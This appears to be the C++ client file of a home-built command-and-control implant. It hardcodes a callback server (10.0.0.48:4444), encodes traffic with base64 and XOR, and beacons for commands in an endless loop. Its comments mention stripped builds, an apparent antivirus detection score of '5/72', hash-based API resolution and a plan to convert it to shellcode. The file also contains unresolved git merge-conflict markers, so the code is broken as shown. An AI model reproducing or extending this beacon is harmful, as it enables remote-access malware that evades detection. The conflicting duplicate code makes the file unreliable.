/* TODO:
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe 
 * */

// TODO: eventually convert to c code then asm then shell code?

//#include "stager.h"


#include "Client.h"
#include "ComponentFactory.h"
#include "TransportLayer.h"

#include <iostream>



/*
Client::Client() : 
	transportLayer_(messageHandler_, "10.0.0.48", "4444") // Default server address
{
	messageHandler_.setTransportLayer(transportLayer_);
}

Client::Client(TCPtransportLayer transportLayer, std::string server, std::string port) : // TODO: transporter parameter isn't used 
	transportLayer_(messageHandler_, server, port)
{
	messageHandler_.setTransportLayer(transportLayer_);
}*/


// TODO: delete?
Client::Client() :
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
		messageHandler_,
		"10.0.0.48",
		"4444",
		TransportLayerType::TCP,
		SerializerType::BINARY,
		EncoderType::BASE64,
		EncryptorType::XOR
		)
	)
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
	std::cout << "inside default constructor for client" << std::endl;
}

<<<<<<< HEAD

Client::Client(
	const std::string& host,
	const std::string& port, 
	TransportLayerType transportType, 
	SerializerType serializerType, 
	EncoderType encoderType, 
	EncryptorType encryptorType)
	:
=======
Client::Client(
	const std::string& server,
	const std::string& port,
	TransportType transportType,
	SerializerType serializerType,
	EncoderType encoderType,
	EncryptorType encryptorType)
	:
	messageHandler_(),
	transportLayerPtr_(
		TransportFactory::create(
			messageHandler_,
			server,
			port,
			transportType,
			serializerType,
			encoderType,
			encryptorType)
	)
{}
/*
Client::Client() :
>>>>>>> 57908ee250d5f635af889a6bc389567a4b68d2ad
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
			messageHandler_,
			host,
			port,
			transportType,
			serializerType,
			encoderType,
			encryptorType
		)
	)
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
	std::cout << "inside parameter constructor for client" << std::endl;
}

Client::~Client()
{
	std::cout << "Client being deconstructed" << std::endl;
}

bool Client::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/


	while (true)
	{
		if (!transportLayerPtr_->isConnected())
		{
			transportLayerPtr_->connect();    // Try to connect (handles if already connected)
		}
		
		if (transportLayerPtr_->isConnected())
		{
			transportLayerPtr_->testMessage();
			transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
			//transporter_.receive();
			//transporter_.sendMessage();
		}

		Sleep(5000);            // Wait 5 seconds
	}
	return false;
}
